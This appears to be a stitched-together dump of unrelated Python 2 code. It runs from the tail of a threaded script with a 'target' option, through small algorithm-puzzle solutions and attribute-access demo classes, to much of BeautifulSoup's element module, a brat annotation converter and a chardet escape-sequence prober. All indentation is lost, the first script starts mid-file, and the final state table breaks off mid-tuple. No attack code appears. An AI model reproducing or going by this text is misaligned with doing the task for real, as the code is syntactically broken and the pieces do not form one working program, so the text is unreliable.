parser = OptionParser()
parser.add_option("-t", "--target", action="store",
dest="target",
default=False,
type="string",
help="test target"
)
parser.add_option("-l", "--lines", action="store",
dest="lines",
default=350000,
type="int",
help="lines of content"
)
parser.add_option("-n", "--threads", action="store",
dest="threads",
default=30,
type="int",
help="number of threads"
)
parser.add_option("-p", "--process", action="store_true",
dest="process",
default=False,
help="run it using process instead of thread"
)
(options, args) = parser.parse_args()
print "number of threads: %d" % options.threads
print "number of lines: %d" % options.lines
if options.process:
print "running with Process"
for i in xrange(options.threads):
WorkerProcess(options, args).start()
else:
print "running with Thread"
for i in xrange(options.threads):
WorkerThread(options, args).start()
class Solution(object):
def __init__(self):
self.combs = {}
def solve(self, cipher):
C, N = cipher
return self.get_combinations(N, C, 0)
def get_combinations(self, t, lst, k):
if t == 0:
return 1
if t < 0 or k >= len(lst):
return 0
if (t, k) not in self.combs:
cnt = 0
while t >= 0:
cnt += self.get_combinations(t, lst, k + 1)
t -= lst[k]
self.combs[(t, k)] = cnt
return self.combs[(t, k)]
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
C = map(int, f.readline().strip().split(', '))
N = int(f.readline().strip())
cipher = C, N
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
m, n, A, B = cipher
f = [["" for _ in xrange(n + 1)] for _ in xrange(m + 1)]
for i in xrange(1, m + 1):
for j in xrange(1, n + 1):
if A[i - 1] == B[j - 1]:
f[i][j] = f[i - 1][j - 1] + " " + A[i - 1]
else:
if len(f[i - 1][j]) > len(f[i][j - 1]):
f[i][j] = f[i - 1][j]
else:
f[i][j] = f[i][j - 1]
return f[m][n].strip()
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
m, n = map(int, f.readline().strip().split(' '))
A = f.readline().strip().split(' ')
B = f.readline().strip().split(' ')
cipher = m, n, A, B
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
N, A = cipher
maxa = 1
f = [1 for _ in xrange(N)]
for i in xrange(1, N):
for j in xrange(i):
if A[i] > A[j]:
f[i] = max(f[i], f[j] + 1)
maxa = max(maxa, f[i])
return maxa
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N = int(f.readline().strip())
A = []
for _ in xrange(N):
A.append(int(f.readline().strip()))
cipher = N, A
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
N, A = cipher
maxa = max(A)
if maxa < 0:
return "%d %d" % (maxa, maxa)
sum_b = sum(filter(lambda x: x > 0, A))
sum_a = 0
current_sum = 0
for a in A:
current_sum += a
if current_sum < 0:
current_sum = 0
sum_a = max(sum_a, current_sum)
return "%d %d" % (sum_a, sum_b)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
N = int(f.readline().strip())
A = map(int, f.readline().strip().split(' '))
cipher = N, A
s = "%s\n" % (solution.solve(cipher))
print s,
class LazyDataStore(object):
def __init__(self):
self.existing_attr = 5
def __getattr__(self, name):
value = 'Value for % s' % name
setattr(self, name, value)
return value
class LazyDataStore2(object):
def __init__(self):
self.existing_attr = 5
def __getattribute__(self, name):
try:
return super(LazyDataStore2, self).__getattribute__(name)
except AttributeError:
value = 'Value for %s' % name
setattr(self, name, value)
return value
def __setattr__(self, name, value):
print "Aspect: Save some data to the DB log"
super(LazyDataStore2, self).__setattr__(name, value)
class DictionaryDB(object):
def __init__(self, data):
self._data = data
def __getattribute__(self, name):
_data = super(DictionaryDB, self).__getattribute__('_data')
return _data[name]
import collections
import re
import sys
import warnings
from bs4.dammit import EntitySubstitution
DEFAULT_OUTPUT_ENCODING = "utf-8"
PY3K = (sys.version_info[0] > 2)
whitespace_re = re.compile("\s+")
def _alias(attr):
@property
def alias(self):
return getattr(self, attr)
@alias.setter
def alias(self):
return setattr(self, attr)
return alias
class NamespacedAttribute(unicode):
def __new__(cls, prefix, name, namespace=None):
if name is None:
obj = unicode.__new__(cls, prefix)
else:
obj = unicode.__new__(cls, prefix + ":" + name)
obj.prefix = prefix
obj.name = name
obj.namespace = namespace
return obj
class AttributeValueWithCharsetSubstitution(unicode):
class CharsetMetaAttributeValue(AttributeValueWithCharsetSubstitution):
def __new__(cls, original_value):
obj = unicode.__new__(cls, original_value)
obj.original_value = original_value
return obj
def encode(self, encoding):
return encoding
class ContentMetaAttributeValue(AttributeValueWithCharsetSubstitution):
CHARSET_RE = re.compile("((^|;)\s*charset=)([^;]*)", re.M)
def __new__(cls, original_value):
match = cls.CHARSET_RE.search(original_value)
if match is None:
return unicode.__new__(unicode, original_value)
obj = unicode.__new__(cls, original_value)
obj.original_value = original_value
return obj
def encode(self, encoding):
def rewrite(match):
return match.group(1) + encoding
return self.CHARSET_RE.sub(rewrite, self.original_value)
class PageElement(object):
FORMATTERS = {
"html" : EntitySubstitution.substitute_html,
"minimal" : EntitySubstitution.substitute_xml,
None : None
}
@classmethod
def format_string(self, s, formatter='minimal'):
if not callable(formatter):
formatter = self.FORMATTERS.get(
formatter, EntitySubstitution.substitute_xml)
if formatter is None:
output = s
else:
output = formatter(s)
return output
def setup(self, parent=None, previous_element=None):
self.parent = parent
self.previous_element = previous_element
if previous_element is not None:
self.previous_element.next_element = self
self.next_element = None
self.previous_sibling = None
self.next_sibling = None
if self.parent is not None and self.parent.contents:
self.previous_sibling = self.parent.contents[-1]
self.previous_sibling.next_sibling = self
nextSibling = _alias("next_sibling")
previousSibling = _alias("previous_sibling")
def replace_with(self, replace_with):
if replace_with is self:
return
if replace_with is self.parent:
raise ValueError("Cannot replace a Tag with its parent.")
old_parent = self.parent
my_index = self.parent.index(self)
self.extract()
old_parent.insert(my_index, replace_with)
return self
replaceWith = replace_with
def unwrap(self):
my_parent = self.parent
my_index = self.parent.index(self)
self.extract()
for child in reversed(self.contents[:]):
my_parent.insert(my_index, child)
return self
replace_with_children = unwrap
replaceWithChildren = unwrap
def wrap(self, wrap_inside):
me = self.replace_with(wrap_inside)
wrap_inside.append(me)
return wrap_inside
def extract(self):
if self.parent is not None:
del self.parent.contents[self.parent.index(self)]
last_child = self._last_descendant()
next_element = last_child.next_element
if self.previous_element is not None:
self.previous_element.next_element = next_element
if next_element is not None:
next_element.previous_element = self.previous_element
self.previous_element = None
last_child.next_element = None
self.parent = None
if self.previous_sibling is not None:
self.previous_sibling.next_sibling = self.next_sibling
if self.next_sibling is not None:
self.next_sibling.previous_sibling = self.previous_sibling
self.previous_sibling = self.next_sibling = None
return self
def _last_descendant(self):
"Finds the last element beneath this object to be parsed."
last_child = self
while hasattr(last_child, 'contents') and last_child.contents:
last_child = last_child.contents[-1]
return last_child
_lastRecursiveChild = _last_descendant
def insert(self, position, new_child):
if new_child is self:
raise ValueError("Cannot insert a tag into itself.")
if (isinstance(new_child, basestring)
and not isinstance(new_child, NavigableString)):
new_child = NavigableString(new_child)
position = min(position, len(self.contents))
if hasattr(new_child, 'parent') and new_child.parent is not None:
if new_child.parent is self:
current_index = self.index(new_child)
if current_index < position:
position -= 1
new_child.extract()
new_child.parent = self
previous_child = None
if position == 0:
new_child.previous_sibling = None
new_child.previous_element = self
else:
previous_child = self.contents[position - 1]
new_child.previous_sibling = previous_child
new_child.previous_sibling.next_sibling = new_child
new_child.previous_element = previous_child._last_descendant()
if new_child.previous_element is not None:
new_child.previous_element.next_element = new_child
new_childs_last_element = new_child._last_descendant()
if position >= len(self.contents):
new_child.next_sibling = None
parent = self
parents_next_sibling = None
while parents_next_sibling is None and parent is not None:
parents_next_sibling = parent.next_sibling
parent = parent.parent
if parents_next_sibling is not None:
break
if parents_next_sibling is not None:
new_childs_last_element.next_element = parents_next_sibling
else:
new_childs_last_element.next_element = None
else:
next_child = self.contents[position]
new_child.next_sibling = next_child
if new_child.next_sibling is not None:
new_child.next_sibling.previous_sibling = new_child
new_childs_last_element.next_element = next_child
if new_childs_last_element.next_element is not None:
new_childs_last_element.next_element.previous_element = new_childs_last_element
self.contents.insert(position, new_child)
def append(self, tag):
self.insert(len(self.contents), tag)
def insert_before(self, predecessor):
if self is predecessor:
raise ValueError("Can't insert an element before itself.")
parent = self.parent
if parent is None:
raise ValueError(
"Element has no parent, so 'before' has no meaning.")
if isinstance(predecessor, PageElement):
predecessor.extract()
index = parent.index(self)
parent.insert(index, predecessor)
def insert_after(self, successor):
if self is successor:
raise ValueError("Can't insert an element after itself.")
parent = self.parent
if parent is None:
raise ValueError(
"Element has no parent, so 'after' has no meaning.")
if isinstance(successor, PageElement):
successor.extract()
index = parent.index(self)
parent.insert(index+1, successor)
def find_next(self, name=None, attrs={}, text=None, **kwargs):
return self._find_one(self.find_all_next, name, attrs, text, **kwargs)
findNext = find_next
def find_all_next(self, name=None, attrs={}, text=None, limit=None,
**kwargs):
return self._find_all(name, attrs, text, limit, self.next_elements,
**kwargs)
findAllNext = find_all_next
def find_next_sibling(self, name=None, attrs={}, text=None, **kwargs):
return self._find_one(self.find_next_siblings, name, attrs, text,
**kwargs)
findNextSibling = find_next_sibling
def find_next_siblings(self, name=None, attrs={}, text=None, limit=None,
**kwargs):
return self._find_all(name, attrs, text, limit,
self.next_siblings, **kwargs)
findNextSiblings = find_next_siblings
fetchNextSiblings = find_next_siblings
def find_previous(self, name=None, attrs={}, text=None, **kwargs):
return self._find_one(
self.find_all_previous, name, attrs, text, **kwargs)
findPrevious = find_previous
def find_all_previous(self, name=None, attrs={}, text=None, limit=None,
**kwargs):
return self._find_all(name, attrs, text, limit, self.previous_elements,
**kwargs)
findAllPrevious = find_all_previous
fetchPrevious = find_all_previous
def find_previous_sibling(self, name=None, attrs={}, text=None, **kwargs):
return self._find_one(self.find_previous_siblings, name, attrs, text,
**kwargs)
findPreviousSibling = find_previous_sibling
def find_previous_siblings(self, name=None, attrs={}, text=None,
limit=None, **kwargs):
return self._find_all(name, attrs, text, limit,
self.previous_siblings, **kwargs)
findPreviousSiblings = find_previous_siblings
fetchPreviousSiblings = find_previous_siblings
def find_parent(self, name=None, attrs={}, **kwargs):
r = None
l = self.find_parents(name, attrs, 1)
if l:
r = l[0]
return r
findParent = find_parent
def find_parents(self, name=None, attrs={}, limit=None, **kwargs):
return self._find_all(name, attrs, None, limit, self.parents,
**kwargs)
findParents = find_parents
fetchParents = find_parents
@property
def next(self):
return self.next_element
@property
def previous(self):
return self.previous_element
def _find_one(self, method, name, attrs, text, **kwargs):
r = None
l = method(name, attrs, text, 1, **kwargs)
if l:
r = l[0]
return r
def _find_all(self, name, attrs, text, limit, generator, **kwargs):
"Iterates over a generator looking for things that match."
if isinstance(name, SoupStrainer):
strainer = name
elif text is None and not limit and not attrs and not kwargs:
if name is True or name is None:
return [element for element in generator
if isinstance(element, Tag)]
elif isinstance(name, basestring):
return [element for element in generator
if isinstance(element, Tag) and element.name == name]
else:
strainer = SoupStrainer(name, attrs, text, **kwargs)
else:
strainer = SoupStrainer(name, attrs, text, **kwargs)
results = ResultSet(strainer)
while True:
try:
i = next(generator)
except StopIteration:
break
if i:
found = strainer.search(i)
if found:
results.append(found)
if limit and len(results) >= limit:
break
return results
@property
def next_elements(self):
i = self.next_element
while i is not None:
yield i
i = i.next_element
@property
def next_siblings(self):
i = self.next_sibling
while i is not None:
yield i
i = i.next_sibling
@property
def previous_elements(self):
i = self.previous_element
while i is not None:
yield i
i = i.previous_element
@property
def previous_siblings(self):
i = self.previous_sibling
while i is not None:
yield i
i = i.previous_sibling
@property
def parents(self):
i = self.parent
while i is not None:
yield i
i = i.parent
tag_name_re = re.compile('^[a-z0-9]+$')
attribselect_re = re.compile(
r'^(?P<tag>\w+)?\[(?P<attribute>\w+)(?P<operator>[=~\|\^\$\*]?)' +
r'=?"?(?P<value>[^\]"]*)"?\]$'
)
def _attr_value_as_string(self, value, default=None):
value = self.get(value, default)
if isinstance(value, list) or isinstance(value, tuple):
value =" ".join(value)
return value
def _attribute_checker(self, operator, attribute, value=''):
if operator == '=':
return lambda el: el._attr_value_as_string(attribute) == value
elif operator == '~':
def _includes_value(element):
attribute_value = element.get(attribute, [])
if not isinstance(attribute_value, list):
attribute_value = attribute_value.split()
return value in attribute_value
return _includes_value
elif operator == '^':
return lambda el: el._attr_value_as_string(
attribute, '').startswith(value)
elif operator == '$':
return lambda el: el._attr_value_as_string(
attribute, '').endswith(value)
elif operator == '*':
return lambda el: value in el._attr_value_as_string(attribute, '')
elif operator == '|':
def _is_or_starts_with_dash(element):
attribute_value = element._attr_value_as_string(attribute, '')
return (attribute_value == value or attribute_value.startswith(
value + '-'))
return _is_or_starts_with_dash
else:
return lambda el: el.has_attr(attribute)
def select(self, selector):
tokens = selector.split()
current_context = [self]
for index, token in enumerate(tokens):
if tokens[index - 1] == '>':
continue
m = self.attribselect_re.match(token)
if m is not None:
tag, attribute, operator, value = m.groups()
if not tag:
tag = True
checker = self._attribute_checker(operator, attribute, value)
found = []
for context in current_context:
found.extend(
[el for el in context.find_all(tag) if checker(el)])
current_context = found
continue
if '#' in token:
tag, id = token.split('#', 1)
if tag == "":
tag = True
el = current_context[0].find(tag, {'id': id})
if el is None:
return []
current_context = [el]
continue
if '.' in token:
tag_name, klass = token.split('.', 1)
if not tag_name:
tag_name = True
classes = set(klass.split('.'))
found = []
def classes_match(tag):
if tag_name is not True and tag.name != tag_name:
return False
if not tag.has_attr('class'):
return False
return classes.issubset(tag['class'])
for context in current_context:
found.extend(context.find_all(classes_match))
current_context = found
continue
if token == '*':
found = []
for context in current_context:
found.extend(context.findAll(True))
current_context = found
continue
if token == '>':
tag = tokens[index + 1]
if not tag:
tag = True
found = []
for context in current_context:
found.extend(context.find_all(tag, recursive=False))
current_context = found
continue
if not self.tag_name_re.match(token):
return []
found = []
for context in current_context:
found.extend(context.findAll(token))
current_context = found
return current_context
def nextGenerator(self):
return self.next_elements
def nextSiblingGenerator(self):
return self.next_siblings
def previousGenerator(self):
return self.previous_elements
def previousSiblingGenerator(self):
return self.previous_siblings
def parentGenerator(self):
return self.parents
class NavigableString(unicode, PageElement):
PREFIX = ''
SUFFIX = ''
def __new__(cls, value):
if isinstance(value, unicode):
return unicode.__new__(cls, value)
return unicode.__new__(cls, value, DEFAULT_OUTPUT_ENCODING)
def __getnewargs__(self):
return (unicode(self),)
def __getattr__(self, attr):
if attr == 'string':
return self
else:
raise AttributeError(
"'%s' object has no attribute '%s'" % (
self.__class__.__name__, attr))
def output_ready(self, formatter="minimal"):
output = self.format_string(self, formatter)
return self.PREFIX + output + self.SUFFIX
class PreformattedString(NavigableString):
def output_ready(self, formatter="minimal"):
self.format_string(self, formatter)
return self.PREFIX + self + self.SUFFIX
class CData(PreformattedString):
PREFIX = u'<![CDATA['
SUFFIX = u']]>'
class ProcessingInstruction(PreformattedString):
PREFIX = u'<?'
SUFFIX = u'?>'
class Comment(PreformattedString):
PREFIX = u'<!--'
SUFFIX = u'-->'
class Declaration(PreformattedString):
PREFIX = u'<!'
SUFFIX = u'!>'
class Doctype(PreformattedString):
@classmethod
def for_name_and_ids(cls, name, pub_id, system_id):
value = name
if pub_id is not None:
value += ' PUBLIC "%s"' % pub_id
if system_id is not None:
value += ' "%s"' % system_id
elif system_id is not None:
value += ' SYSTEM "%s"' % system_id
return Doctype(value)
PREFIX = u'<!DOCTYPE '
SUFFIX = u'>\n'
class Tag(PageElement):
def __init__(self, parser=None, builder=None, name=None, namespace=None,
prefix=None, attrs=None, parent=None, previous=None):
"Basic constructor."
if parser is None:
self.parser_class = None
else:
self.parser_class = parser.__class__
if name is None:
raise ValueError("No value provided for new tag's name.")
self.name = name
self.namespace = namespace
self.prefix = prefix
if attrs is None:
attrs = {}
elif builder.cdata_list_attributes:
attrs = builder._replace_cdata_list_attribute_values(
self.name, attrs)
else:
attrs = dict(attrs)
self.attrs = attrs
self.contents = []
self.setup(parent, previous)
self.hidden = False
if builder is not None:
builder.set_up_substitutions(self)
self.can_be_empty_element = builder.can_be_empty_element(name)
else:
self.can_be_empty_element = False
parserClass = _alias("parser_class")
@property
def is_empty_element(self):
return len(self.contents) == 0 and self.can_be_empty_element
isSelfClosing = is_empty_element
@property
def string(self):
if len(self.contents) != 1:
return None
child = self.contents[0]
if isinstance(child, NavigableString):
return child
return child.string
@string.setter
def string(self, string):
self.clear()
self.append(string.__class__(string))
def _all_strings(self, strip=False):
for descendant in self.descendants:
if not isinstance(descendant, NavigableString):
continue
if strip:
descendant = descendant.strip()
if len(descendant) == 0:
continue
yield descendant
strings = property(_all_strings)
@property
def stripped_strings(self):
for string in self._all_strings(True):
yield string
def get_text(self, separator=u"", strip=False):
return separator.join([s for s in self._all_strings(strip)])
getText = get_text
text = property(get_text)
def decompose(self):
self.extract()
i = self
while i is not None:
next = i.next_element
i.__dict__.clear()
i = next
def clear(self, decompose=False):
if decompose:
for element in self.contents[:]:
if isinstance(element, Tag):
element.decompose()
else:
element.extract()
else:
for element in self.contents[:]:
element.extract()
def index(self, element):
for i, child in enumerate(self.contents):
if child is element:
return i
raise ValueError("Tag.index: element not in tag")
def get(self, key, default=None):
return self.attrs.get(key, default)
def has_attr(self, key):
return key in self.attrs
def __hash__(self):
return str(self).__hash__()
def __getitem__(self, key):
return self.attrs[key]
def __iter__(self):
"Iterating over a tag iterates over its contents."
return iter(self.contents)
def __len__(self):
"The length of a tag is the length of its list of contents."
return len(self.contents)
def __contains__(self, x):
return x in self.contents
def __nonzero__(self):
"A tag is non-None even if it has no contents."
return True
def __setitem__(self, key, value):
self.attrs[key] = value
def __delitem__(self, key):
"Deleting tag[key] deletes all 'key' attributes for the tag."
self.attrs.pop(key, None)
def __call__(self, *args, **kwargs):
return self.find_all(*args, **kwargs)
def __getattr__(self, tag):
if len(tag) > 3 and tag.endswith('Tag'):
tag_name = tag[:-3]
warnings.warn(
'.%sTag is deprecated, use .find("%s") instead.' % (
tag_name, tag_name))
return self.find(tag_name)
elif not tag.startswith("__") and not tag=="contents":
return self.find(tag)
raise AttributeError(
"'%s' object has no attribute '%s'" % (self.__class__, tag))
def __eq__(self, other):
if self is other:
return True
if (not hasattr(other, 'name') or
not hasattr(other, 'attrs') or
not hasattr(other, 'contents') or
self.name != other.name or
self.attrs != other.attrs or
len(self) != len(other)):
return False
for i, my_child in enumerate(self.contents):
if my_child != other.contents[i]:
return False
return True
def __ne__(self, other):
return not self == other
def __repr__(self, encoding=DEFAULT_OUTPUT_ENCODING):
return self.encode(encoding)
def __unicode__(self):
return self.decode()
def __str__(self):
return self.encode()
if PY3K:
__str__ = __repr__ = __unicode__
def encode(self, encoding=DEFAULT_OUTPUT_ENCODING,
indent_level=None, formatter="minimal",
errors="xmlcharrefreplace"):
u = self.decode(indent_level, encoding, formatter)
return u.encode(encoding, errors)
def decode(self, indent_level=None,
eventual_encoding=DEFAULT_OUTPUT_ENCODING,
formatter="minimal"):
attrs = []
if self.attrs:
for key, val in sorted(self.attrs.items()):
if val is None:
decoded = key
else:
if isinstance(val, list) or isinstance(val, tuple):
val = ' '.join(val)
elif not isinstance(val, basestring):
val = unicode(val)
elif (
isinstance(val, AttributeValueWithCharsetSubstitution)
and eventual_encoding is not None):
val = val.encode(eventual_encoding)
text = self.format_string(val, formatter)
decoded = (
unicode(key) + '='
+ EntitySubstitution.quoted_attribute_value(text))
attrs.append(decoded)
close = ''
closeTag = ''
prefix = ''
if self.prefix:
prefix = self.prefix + ":"
if self.is_empty_element:
close = '/'
else:
closeTag = '</%s%s>' % (prefix, self.name)
pretty_print = (indent_level is not None)
if pretty_print:
space = (' ' * (indent_level - 1))
indent_contents = indent_level + 1
else:
space = ''
indent_contents = None
contents = self.decode_contents(
indent_contents, eventual_encoding, formatter)
if self.hidden:
s = contents
else:
s = []
attribute_string = ''
if attrs:
attribute_string = ' ' + ' '.join(attrs)
if pretty_print:
s.append(space)
s.append('<%s%s%s%s>' % (
prefix, self.name, attribute_string, close))
if pretty_print:
s.append("\n")
s.append(contents)
if pretty_print and contents and contents[-1] != "\n":
s.append("\n")
if pretty_print and closeTag:
s.append(space)
s.append(closeTag)
if pretty_print and closeTag and self.next_sibling:
s.append("\n")
s = ''.join(s)
return s
def prettify(self, encoding=None, formatter="minimal"):
if encoding is None:
return self.decode(True, formatter=formatter)
else:
return self.encode(encoding, True, formatter=formatter)
def decode_contents(self, indent_level=None,
eventual_encoding=DEFAULT_OUTPUT_ENCODING,
formatter="minimal"):
pretty_print = (indent_level is not None)
s = []
for c in self:
text = None
if isinstance(c, NavigableString):
text = c.output_ready(formatter)
elif isinstance(c, Tag):
s.append(c.decode(indent_level, eventual_encoding,
formatter))
if text and indent_level:
text = text.strip()
if text:
if pretty_print:
s.append(" " * (indent_level - 1))
s.append(text)
if pretty_print:
s.append("\n")
return ''.join(s)
def encode_contents(
self, indent_level=None, encoding=DEFAULT_OUTPUT_ENCODING,
formatter="minimal"):
contents = self.decode_contents(indent_level, encoding, formatter)
return contents.encode(encoding)
def renderContents(self, encoding=DEFAULT_OUTPUT_ENCODING,
prettyPrint=False, indentLevel=0):
if not prettyPrint:
indentLevel = None
return self.encode_contents(
indent_level=indentLevel, encoding=encoding)
def find(self, name=None, attrs={}, recursive=True, text=None,
**kwargs):
r = None
l = self.find_all(name, attrs, recursive, text, 1, **kwargs)
if l:
r = l[0]
return r
findChild = find
def find_all(self, name=None, attrs={}, recursive=True, text=None,
limit=None, **kwargs):
generator = self.descendants
if not recursive:
generator = self.children
return self._find_all(name, attrs, text, limit, generator, **kwargs)
findAll = find_all
findChildren = find_all
@property
def children(self):
return iter(self.contents)
@property
def descendants(self):
if not len(self.contents):
return
stopNode = self._last_descendant().next_element
current = self.contents[0]
while current is not stopNode:
yield current
current = current.next_element
def childGenerator(self):
return self.children
def recursiveChildGenerator(self):
return self.descendants
has_key = has_attr
class SoupStrainer(object):
def __init__(self, name=None, attrs={}, text=None, **kwargs):
self.name = self._normalize_search_value(name)
if not isinstance(attrs, dict):
kwargs['class'] = attrs
attrs = None
if 'class_' in kwargs:
kwargs['class'] = kwargs['class_']
del kwargs['class_']
if kwargs:
if attrs:
attrs = attrs.copy()
attrs.update(kwargs)
else:
attrs = kwargs
normalized_attrs = {}
for key, value in attrs.items():
normalized_attrs[key] = self._normalize_search_value(value)
self.attrs = normalized_attrs
self.text = self._normalize_search_value(text)
def _normalize_search_value(self, value):
if (isinstance(value, unicode) or callable(value) or hasattr(value, 'match')
or isinstance(value, bool) or value is None):
return value
if isinstance(value, bytes):
return value.decode("utf8")
if hasattr(value, '__iter__'):
new_value = []
for v in value:
if (hasattr(v, '__iter__') and not isinstance(v, bytes)
and not isinstance(v, unicode)):
new_value.append(v)
else:
new_value.append(self._normalize_search_value(v))
return new_value
return unicode(str(value))
def __str__(self):
if self.text:
return self.text
else:
return "%s|%s" % (self.name, self.attrs)
def search_tag(self, markup_name=None, markup_attrs={}):
found = None
markup = None
if isinstance(markup_name, Tag):
markup = markup_name
markup_attrs = markup
call_function_with_tag_data = (
isinstance(self.name, collections.Callable)
and not isinstance(markup_name, Tag))
if ((not self.name)
or call_function_with_tag_data
or (markup and self._matches(markup, self.name))
or (not markup and self._matches(markup_name, self.name))):
if call_function_with_tag_data:
match = self.name(markup_name, markup_attrs)
else:
match = True
markup_attr_map = None
for attr, match_against in list(self.attrs.items()):
if not markup_attr_map:
if hasattr(markup_attrs, 'get'):
markup_attr_map = markup_attrs
else:
markup_attr_map = {}
for k, v in markup_attrs:
markup_attr_map[k] = v
attr_value = markup_attr_map.get(attr)
if not self._matches(attr_value, match_against):
match = False
break
if match:
if markup:
found = markup
else:
found = markup_name
if found and self.text and not self._matches(found.string, self.text):
found = None
return found
searchTag = search_tag
def search(self, markup):
found = None
if hasattr(markup, '__iter__') and not isinstance(markup, (Tag, basestring)):
for element in markup:
if isinstance(element, NavigableString) \
and self.search(element):
found = element
break
elif isinstance(markup, Tag):
if not self.text or self.name or self.attrs:
found = self.search_tag(markup)
elif isinstance(markup, NavigableString) or \
isinstance(markup, basestring):
if not self.name and not self.attrs and self._matches(markup, self.text):
found = markup
else:
raise Exception(
"I don't know how to match against a %s" % markup.__class__)
return found
def _matches(self, markup, match_against):
result = False
if isinstance(markup, list) or isinstance(markup, tuple):
if (isinstance(match_against, unicode)
and ' ' in match_against):
return (whitespace_re.split(match_against) == markup)
else:
for item in markup:
if self._matches(item, match_against):
return True
return False
if match_against is True:
return markup is not None
if isinstance(match_against, collections.Callable):
return match_against(markup)
if isinstance(markup, Tag):
markup = markup.name
markup = self._normalize_search_value(markup)
if markup is None:
return not match_against
if isinstance(match_against, unicode):
return markup == match_against
if hasattr(match_against, 'match'):
return match_against.search(markup)
if hasattr(match_against, '__iter__'):
return markup in match_against
class ResultSet(list):
def __init__(self, source):
list.__init__([])
self.source = source
from math import sqrt, floor, ceil
class Solution(object):
def solve(self, cipher):
l = len(cipher)
r = range(int(floor(sqrt(l))), int(ceil(sqrt(l))) + 1)
min_pair = (r[-1], r[-1])
for h in r:
for w in r:
if h * w >= l and h * w < min_pair[0] * min_pair[1]:
min_pair = (h, w)
h, w = min_pair
rect = [[None for _ in xrange(w)] for _ in xrange(h)]
for i in xrange(l):
rect[i / w][i % w] = cipher[i]
result = []
for j in xrange(w):
sb = []
for i in xrange(h):
if rect[i][j] == None: break
sb.append(rect[i][j])
result.append("".join(sb))
return " ".join(result)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
cipher = f.readline().strip()
s = "%s\n" % (Solution().solve(cipher))
print s,
from __future__ import with_statement
import sys
import re
try:
import annotation
except ImportError:
import os.path
from sys import path as sys_path
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/src'))
import annotation
sys_path.append(os.path.join(os.path.dirname(__file__), '..'))
options = None
def ent2event(anntype, fn):
global options
mapped = 0
try:
nosuff_fn = fn.replace(".ann","")
with annotation.TextAnnotations(nosuff_fn) as ann_obj:
for ann in ann_obj.get_entities():
if ann.type != anntype:
continue
new_id = ann_obj.get_new_id('E')
eann = annotation.EventAnnotation(ann.id, [], new_id, ann.type, '')
for e in ann_obj.get_events():
for i in range(0, len(e.args)):
role, argid = e.args[i]
if argid == ann.id:
argid = new_id
e.args[i] = role, argid
for c in ann_obj.get_oneline_comments():
if c.target == ann.id:
c.target = new_id
ann_obj.add_annotation(eann)
mapped += 1
if options.verbose:
print >> sys.stderr, mapped, 'mapped in', fn
except annotation.AnnotationFileNotFoundError:
print >> sys.stderr, "%s:\tFailed: file not found" % fn
except annotation.AnnotationNotFoundError, e:
print >> sys.stderr, "%s:\tFailed: %s" % (fn, e)
def argparser():
import argparse
ap=argparse.ArgumentParser(description="Rewrite entity annotations of a given type as events.")
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output.")
ap.add_argument("type", metavar="TYPE", help="Type to rewrite.")
ap.add_argument("files", metavar="FILE", nargs="+", help="File to process.")
return ap
def main(argv=None):
global options
if argv is None:
argv = sys.argv
arg = argparser().parse_args(argv[1:])
options = arg
for fn in arg.files:
ent2event(arg.type, fn)
if __name__ == "__main__":
import sys
sys.exit(main(sys.argv))
from . import constants
from .escsm import (HZSMModel, ISO2022CNSMModel, ISO2022JPSMModel,
ISO2022KRSMModel)
from .charsetprober import CharSetProber
from .codingstatemachine import CodingStateMachine
from .compat import wrap_ord
class EscCharSetProber(CharSetProber):
def __init__(self):
CharSetProber.__init__(self)
self._mCodingSM = [
CodingStateMachine(HZSMModel),
CodingStateMachine(ISO2022CNSMModel),
CodingStateMachine(ISO2022JPSMModel),
CodingStateMachine(ISO2022KRSMModel)
]
self.reset()
def reset(self):
CharSetProber.reset(self)
for codingSM in self._mCodingSM:
if not codingSM:
continue
codingSM.active = True
codingSM.reset()
self._mActiveSM = len(self._mCodingSM)
self._mDetectedCharset = None
def get_charset_name(self):
return self._mDetectedCharset
def get_confidence(self):
if self._mDetectedCharset:
return 0.99
else:
return 0.00
def feed(self, aBuf):
for c in aBuf:
for codingSM in self._mCodingSM:
if not codingSM:
continue
if not codingSM.active:
continue
codingState = codingSM.next_state(wrap_ord(c))
if codingState == constants.eError:
codingSM.active = False
self._mActiveSM -= 1
if self._mActiveSM <= 0:
self._mState = constants.eNotMe
return self.get_state()
elif codingState == constants.eItsMe:
self._mState = constants.eFoundIt
self._mDetectedCharset = codingSM.get_coding_state_machine()
return self.get_state()
return self.get_state()
from .constants import eStart, eError, eItsMe
HZ_cls = (
1,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,1,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,4,0,5,2,0,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
)
HZ_st = (
eStart,eError,     3,eStart,eStart,eStart,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eError,eError,eStart,eStart,     4,eError,
5,eError,     6,eError,     5,     5,     4,eError,
4,eError,     4,     4,     4,eError,     4,eError,
